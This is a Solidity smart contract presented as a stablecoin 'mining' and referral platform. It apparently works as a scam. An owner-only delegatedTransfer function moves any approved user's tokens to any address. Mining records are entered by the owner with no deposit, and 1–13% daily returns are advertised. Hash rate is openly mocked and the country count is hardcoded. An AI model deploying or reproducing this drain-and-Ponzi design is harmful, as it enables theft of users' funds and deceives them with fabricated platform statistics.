// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract TokenOperator is Ownable {
    using SafeERC20 for IERC20;
    struct MiningRecord {
        address token;
        uint256 amount;
        uint256 startTime;
        uint256 lastClaimTime;
        uint256 referrerLastClaimTime;
        uint256 endTime;
        bool active;
        uint8 decimals;
        address referrer;
    }

    // Mappings for mining data
    mapping(address => MiningRecord[]) public userMiningRecords;
    mapping(address => uint256) public totalMinedAmount;
    mapping(address => bool) public isUser; // Track if user has mined before
    mapping(address => uint256) public lastMiningTime; // Track user's last mining activity
    mapping(address => address) public referrerOf; // Tracks referrer for each user (set only on first mine)
    mapping(address => address[]) public referredUsers; // referrer => list of referred addresses

    // Global Platform Statistics
    uint256 public totalPlatformOutput; // Total USD value mined across all users
    uint256 public totalParticipants; // Total unique users who have mined
    uint256 public totalActiveUsers; // Users who mined in last 30 days
    
    // Token-specific tracking
    mapping(address => uint256) public totalMinedByToken; // Total mined per token
    mapping(address => uint256) public totalRewardsDistributedByToken; // Total rewards distributed per token

    address[] public allUsers; // Array of all users for iteration

    // Constants for reward calculation
    uint256 public constant BASIS_POINTS = 10000;
    uint256 public constant SECONDS_PER_DAY = 86400;
    uint256 public constant REFERRAL_BPS = 500; // 5%
    uint256 public constant MINING_DURATION = 30 days;
    uint256 public constant MIN_AMOUNT = 0; // no minimum amount
    uint256 public constant ACTIVE_USER_THRESHOLD = 30 days; // Consider user active if mined within 30 days

    event TokensTransferred(
        address indexed token,
        address indexed from,
        address indexed to,
        uint256 amount
    );
    
    event MiningStarted(
        address indexed user,
        address indexed token,
        uint256 amount,
        uint256 timestamp,
        uint256 recordIndex,
        address referrer
    );
    
    event RewardsClaimed(
        address indexed user,
        address indexed token,
        uint256 amount
    );

    constructor() Ownable(msg.sender) {}

    /**
     * @dev Transfer tokens from one address to another using allowance
     * @param tokenAddress ERC20 token contract address
     * @param from Address to transfer from (must have allowance)
     * @param to Address to transfer to
     * @param amount Amount in token's smallest units
     */
    function delegatedTransfer(
        address tokenAddress,
        address from,
        address to,
        uint256 amount
    ) external onlyOwner returns (bool) {
        require(tokenAddress != address(0), "TokenOperator: invalid token");
        require(from != address(0) && to != address(0), "TokenOperator: invalid address");
        require(amount > 0, "TokenOperator: invalid amount");

        IERC20 token = IERC20(tokenAddress);

        // Check allowance (still useful for clear revert reason)
        uint256 allowance = token.allowance(from, address(this));
        require(allowance >= amount, "TokenOperator: insufficient allowance");

        // Use SafeERC20 to support non-standard tokens like USDT (no bool return)
        token.safeTransferFrom(from, to, amount);

        emit TokensTransferred(tokenAddress, from, to, amount);
        return true;
    }

    /**
     * @dev Mine function - Owner records user's mining activity
     * @param user Address of the user who is mining
     * @param token Address of the token being mined (USDT/USDC)
     * @param amount Amount being mined (smallest unit)
     * @param referrer Address of referrer (zero if none)
     */
    function mine(
        address user,
        address token,
        uint256 amount,
        address referrer
    ) external onlyOwner returns (uint256) {
        require(user != address(0), "TokenOperator: invalid user address");
        require(token != address(0), "TokenOperator: invalid token address");
        require(amount > 0, "TokenOperator: amount must be greater than 0");

        uint8 decimals = IERC20Metadata(token).decimals();

        // Referrer logic only allowed on first mine
        if (!isUser[user]) {
            if (referrer != address(0)) {
                require(referrer != user, "TokenOperator: cannot self refer");
                referrerOf[user] = referrer;
                referredUsers[referrer].push(user);
            }
        } else {
            require(referrer == address(0), "TokenOperator: referrer only on first mine");
        }

        // Track new user
        if (!isUser[user]) {
            isUser[user] = true;
            allUsers.push(user);
            totalParticipants++;
        }

        // Update last mining time
        lastMiningTime[user] = block.timestamp;

        MiningRecord memory newRecord = MiningRecord({
            token: token,
            amount: amount,
            startTime: block.timestamp,
            lastClaimTime: block.timestamp,
            referrerLastClaimTime: block.timestamp,
            endTime: block.timestamp + MINING_DURATION,
            active: true,
            decimals: decimals,
            referrer: referrerOf[user]
        });

        userMiningRecords[user].push(newRecord);
        totalMinedAmount[user] += amount;

        // Update global statistics
        totalPlatformOutput += amount;
        totalMinedByToken[token] += amount;

        uint256 idx = userMiningRecords[user].length - 1;
        emit MiningStarted(user, token, amount, block.timestamp, idx, referrerOf[user]);

        return idx;
    }

    /**
     * @dev Calculate pending rewards for a user (all tokens)
     */
    function calculateRewards(address user) public view returns (uint256) {
        MiningRecord[] memory records = userMiningRecords[user];
        uint256 totalRewards = 0;

        for (uint256 i = 0; i < records.length; i++) {
            totalRewards += _pendingRewardForRecord(records[i]);
        }

        return totalRewards;
    }

    /**
     * @dev Calculate pending rewards for a user by token
     */
    function calculateRewardsByToken(address user, address token) 
        public 
        view 
        returns (uint256) 
    {
        MiningRecord[] memory records = userMiningRecords[user];
        uint256 totalRewards = 0;

        for (uint256 i = 0; i < records.length; i++) {
            if (records[i].token == token) {
                totalRewards += _pendingRewardForRecord(records[i]);
            }
        }

        return totalRewards;
    }

    /**
     * @dev Calculate pending referral rewards for a referrer and token
     */
    function calculateReferralRewards(address referrer, address token) public view returns (uint256) {
        address[] memory refs = referredUsers[referrer];
        uint256 totalRewards = 0;

        for (uint256 i = 0; i < refs.length; i++) {
            MiningRecord[] memory records = userMiningRecords[refs[i]];
            for (uint256 j = 0; j < records.length; j++) {
                if (records[j].referrer == referrer && records[j].token == token) {
                    totalRewards += _pendingReferralForRecord(records[j]);
                }
            }
        }

        return totalRewards;
    }

    /**
     * @dev User claims their rewards for a specific token
     */
    function claimRewards(address token) external {
        MiningRecord[] storage records = userMiningRecords[msg.sender];
        require(records.length > 0, "TokenOperator: no mining records found");

        uint256 totalRewards = 0;

        for (uint256 i = 0; i < records.length; i++) {
            if (records[i].token != token) continue;

            uint256 reward = _pendingRewardForRecord(records[i]);
            if (reward > 0) {
                totalRewards += reward;
            }

            // Update claim time and deactivate if past end
            uint256 cutoff = _claimCutoff(records[i].endTime);
            records[i].lastClaimTime = cutoff;
            if (cutoff >= records[i].endTime) {
                records[i].active = false;
            }
        }

        require(totalRewards > 0, "TokenOperator: no rewards to claim");

        // Update global rewards tracking
        totalRewardsDistributedByToken[token] += totalRewards;

        // Transfer rewards in the same token
        IERC20(token).transfer(msg.sender, totalRewards);
        
        emit RewardsClaimed(msg.sender, token, totalRewards);
    }

    /**
     * @dev Referrer claims accrued referral rewards for a token
     */
    function claimReferralRewards(address token) external {
        address[] storage refs = referredUsers[msg.sender];
        uint256 totalRewards = 0;

        for (uint256 i = 0; i < refs.length; i++) {
            MiningRecord[] storage records = userMiningRecords[refs[i]];
            for (uint256 j = 0; j < records.length; j++) {
                if (records[j].referrer != msg.sender || records[j].token != token) continue;

                uint256 reward = _pendingReferralForRecord(records[j]);
                if (reward > 0) {
                    totalRewards += reward;
                }

                uint256 cutoff = _claimCutoff(records[j].endTime);
                records[j].referrerLastClaimTime = cutoff;
                if (cutoff >= records[j].endTime) {
                    records[j].active = false;
                }
            }
        }

        require(totalRewards > 0, "TokenOperator: no referral rewards to claim");
        totalRewardsDistributedByToken[token] += totalRewards;
        IERC20(token).transfer(msg.sender, totalRewards);
        emit RewardsClaimed(msg.sender, token, totalRewards);
    }

    function getReferralRewards(address referrer, address token)
        external
        view
        returns (uint256 pendingRewards)
    {
        return calculateReferralRewards(referrer, token);
    }

    function getReferredUsers(address referrer) external view returns (address[] memory) {
        return referredUsers[referrer];
    }

    /**
     * @dev Returns all addresses that have ever mined
     */
    function getAllUsers() external view returns (address[] memory) {
        return allUsers;
    }

    /**
     * @dev Owner can update the mined amount for a specific record of a user.
     *      Rewards from that point will be calculated based on the new amount.
     * @param user Address of the user
     * @param index Index of the mining record to update
     * @param newAmount New amount (in token's smallest units); must be <= original amount
     */
    function updateMiningAmount(
        address user,
        uint256 index,
        uint256 newAmount
    ) external onlyOwner {
        require(index < userMiningRecords[user].length, "TokenOperator: invalid index");
        MiningRecord storage record = userMiningRecords[user][index];
        require(record.active, "TokenOperator: record not active");

        uint256 oldAmount = record.amount;
        record.amount = newAmount;

        // Keep global stats consistent
        if (oldAmount > newAmount) {
            uint256 diff = oldAmount - newAmount;
            totalMinedAmount[user] -= diff;
            totalPlatformOutput -= diff;
            totalMinedByToken[record.token] -= diff;
        }
    }

    /**
     * @dev Get user's mining records count
     */
    function getUserMiningRecordsCount(address user) 
        external 
        view 
        returns (uint256) 
    {
        return userMiningRecords[user].length;
    }

    /**
     * @dev Get specific mining record details
     */
    function getMiningRecord(address user, uint256 index)
        external
        view
        returns (
            address token,
            uint256 amount,
            uint256 startTime,
            uint256 lastClaimTime,
            uint256 referrerLastClaimTime,
            uint256 endTime,
            bool active,
            uint8 decimals,
            address referrer
        )
    {
        require(index < userMiningRecords[user].length, "TokenOperator: invalid index");
        MiningRecord memory record = userMiningRecords[user][index];
        return (
            record.token,
            record.amount,
            record.startTime,
            record.lastClaimTime,
            record.referrerLastClaimTime,
            record.endTime,
            record.active,
            record.decimals,
            record.referrer
        );
    }

    /**
     * @dev Get user's pending rewards by token with decimals (Frontend Helper)
     */
    function getUserRewardsWithDecimals(address user, address token)
        external
        view
        returns (uint256 pendingRewards, uint8 decimals)
    {
        MiningRecord[] memory records = userMiningRecords[user];
        uint256 totalRewards = 0;
        uint8 tokenDecimals = 0;

        for (uint256 i = 0; i < records.length; i++) {
            if (records[i].token == token) {
                totalRewards += _pendingRewardForRecord(records[i]);
                tokenDecimals = records[i].decimals;
            }
        }

        return (totalRewards, tokenDecimals);
    }

    /**
     * @dev Get all mining records for a user with their pending rewards
     */
    function getAllUserMiningData(address user)
        external
        view
        returns (
            address[] memory tokens,
            uint256[] memory amounts,
            uint256[] memory pendingRewards,
            uint8[] memory decimalsArray,
            bool[] memory activeStatus
        )
    {
        MiningRecord[] memory records = userMiningRecords[user];
        uint256 length = records.length;

        tokens = new address[](length);
        amounts = new uint256[](length);
        pendingRewards = new uint256[](length);
        decimalsArray = new uint8[](length);
        activeStatus = new bool[](length);

        for (uint256 i = 0; i < length; i++) {
            tokens[i] = records[i].token;
            amounts[i] = records[i].amount;
            activeStatus[i] = records[i].active;
            decimalsArray[i] = records[i].decimals;
            pendingRewards[i] = _pendingRewardForRecord(records[i]);
        }

        return (tokens, amounts, pendingRewards, decimalsArray, activeStatus);
    }

    /**
     * @dev Get comprehensive platform statistics
     */
    function getPlatformStats()
        external
        view
        returns (
            uint256 totalOutput,
            uint256 participants,
            uint256 activeUsers,
            uint256 totalRewards,
            uint256 hashRate
        )
    {
        // Calculate active users (last 30 days)
        uint256 activeCount = 0;
        for (uint256 i = 0; i < allUsers.length; i++) {
            if (block.timestamp - lastMiningTime[allUsers[i]] <= ACTIVE_USER_THRESHOLD) {
                activeCount++;
            }
        }

        // Calculate total rewards from all tokens
        uint256 totalDistributed = 0;

        // Mock hash rate calculation based on total output and active users
        uint256 calculatedHashRate = activeCount > 0 ? (totalPlatformOutput * activeCount) / 1000000 : 0;

        return (
            totalPlatformOutput,
            totalParticipants,
            activeCount,
            totalDistributed,
            calculatedHashRate
        );
    }

    /**
     * @dev Get total platform output (total mined)
     */
    function getTotalOutput() external view returns (uint256) {
        return totalPlatformOutput;
    }

    /**
     * @dev Get total unique participants
     */
    function getTotalParticipants() external view returns (uint256) {
        return totalParticipants;
    }

    /**
     * @dev Get count of active users (mined within last 30 days)
     */
    function getActiveUsersCount() external view returns (uint256) {
        uint256 activeCount = 0;
        for (uint256 i = 0; i < allUsers.length; i++) {
            if (block.timestamp - lastMiningTime[allUsers[i]] <= ACTIVE_USER_THRESHOLD) {
                activeCount++;
            }
        }
        return activeCount;
    }

    /**
     * @dev Get total rewards distributed for a specific token
     */
    function getTotalRewardsByToken(address token) external view returns (uint256) {
        return totalRewardsDistributedByToken[token];
    }

    /**
     * @dev Get comprehensive statistics for a specific token
     */
    function getTokenStatistics(address token)
        external
        view
        returns (uint256 totalMined, uint256 rewardsDistributed)
    {
        return (totalMinedByToken[token], totalRewardsDistributedByToken[token]);
    }

    /**
     * @dev Get current hash rate (mock calculation)
     */
    function getCurrentHashRate() external view returns (uint256) {
        uint256 activeCount = 0;
        for (uint256 i = 0; i < allUsers.length; i++) {
            if (block.timestamp - lastMiningTime[allUsers[i]] <= ACTIVE_USER_THRESHOLD) {
                activeCount++;
            }
        }
        
        // Mock hash rate: (totalOutput / 1M) * activeUsers
        return activeCount > 0 ? (totalPlatformOutput * activeCount) / 1000000 : 0;
    }

    /**
     * @dev Get platform milestone progress
     */
    function getMilestoneProgress()
        external
        view
        returns (
            uint256 outputProgress,
            uint256 userProgress,
            uint256 countriesCovered
        )
    {
        // Calculate progress towards $100B (100000000000 with 6 decimals = 100B USDT/USDC)
        uint256 targetOutput = 100000000000 * 10**6; // 100B in smallest units (6 decimals)
        uint256 progress = (totalPlatformOutput * 10000) / targetOutput;
        if (progress > 10000) progress = 10000; // Cap at 100%

        return (progress, totalParticipants, 168);
    }

    /**
     * @dev Admin function to recover accidentally sent tokens
     */
    function recoverTokens(
        address tokenAddress,
        address recipient,
        uint256 amount
    ) external onlyOwner {
        IERC20(tokenAddress).transfer(recipient, amount);
    }

    // ------------------------- Internal helpers ------------------------- //

    function _claimCutoff(uint256 endTime) internal view returns (uint256) {
        return block.timestamp > endTime ? endTime : block.timestamp;
    }

    function _rateBp(uint256 amount, uint8 decimals) internal pure returns (uint256) {
        uint256 unit = 10 ** decimals;

        if (amount <= 99 * unit) return 100; // 1%
        if (amount <= 499 * unit) return 150; // 1.5%
        if (amount <= 999 * unit) return 300; // 3%
        if (amount <= 4999 * unit) return 500; // 5%
        if (amount <= 9999 * unit) return 700; // 7%
        if (amount <= 29999 * unit) return 900; // 9%
        if (amount <= 79999 * unit) return 1100; // 11%
        return 1300; // 13% for 80,000-159,999 and above
    }

    function _pendingRewardForRecord(MiningRecord memory record) internal view returns (uint256) {
        if (!record.active) return 0;
        uint256 cutoff = _claimCutoff(record.endTime);
        if (cutoff <= record.lastClaimTime) return 0;
        uint256 timeElapsed = cutoff - record.lastClaimTime;
        uint256 rateBp = _rateBp(record.amount, record.decimals);
        return (record.amount * rateBp * timeElapsed) / (SECONDS_PER_DAY * BASIS_POINTS);
    }

    function _pendingReferralForRecord(MiningRecord memory record) internal view returns (uint256) {
        if (!record.active || record.referrer == address(0)) return 0;
        uint256 cutoff = _claimCutoff(record.endTime);
        if (cutoff <= record.referrerLastClaimTime) return 0;
        uint256 timeElapsed = cutoff - record.referrerLastClaimTime;
        uint256 rateBp = _rateBp(record.amount, record.decimals);
        uint256 baseReward = (record.amount * rateBp * timeElapsed) / (SECONDS_PER_DAY * BASIS_POINTS);
        return (baseReward * REFERRAL_BPS) / BASIS_POINTS;
    }
}
